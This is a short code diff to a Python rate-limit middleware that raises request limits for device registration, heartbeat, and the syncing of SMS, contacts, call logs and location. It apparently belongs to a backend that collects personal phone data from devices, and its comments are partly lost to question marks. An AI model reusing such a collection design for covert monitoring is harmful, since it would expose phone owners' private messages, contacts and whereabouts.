@@ -38,19 +38,19 @@ class RateLimitMiddleware(BaseHTTPMiddleware):
             "/auth/verify-2fa": 10,
             
             # Device endpoints (??????? ???? ???? heartbeat ? sync)
-            "/register": 100,  # Device registration - ?????? ????
-            "/ping": 500,  # Heartbeat/ping - ???? ????
-            "/heartbeat": 500,  # Heartbeat
-            "/status": 300,  # Status update
-            "/device-info": 200,  # Device info update
+            "/register": 500,  # Device registration - ????
+            "/ping": 2000,  # Heartbeat/ping - ???? ????!
+            "/heartbeat": 2000,  # Heartbeat
+            "/status": 1000,  # Status update
+            "/device-info": 500,  # Device info update
             
-            # Data sync endpoints (??????? ????? ?? ????)
-            "/sms": 300,  # SMS sync - ?????? ????
-            "/contacts": 200,  # Contacts sync - ?????? ????
-            "/call-logs": 200,  # Call logs sync - ?????? ????
-            "/logs": 200,  # Device logs
-            "/location": 300,  # Location updates
-            "/battery": 300,  # Battery status
+            # Data sync endpoints - ??????? ?? (??????? ????)
+            "/sms": 1000,  # SMS sync - ????
+            "/contacts": 500,  # Contacts sync
+            "/call-logs": 500,  # Call logs sync
+            "/logs": 500,  # Device logs
+            "/location": 1000,  # Location updates
+            "/battery": 1000,  # Battery status
         }
         
         # Whitelist IPs (no rate limiting)
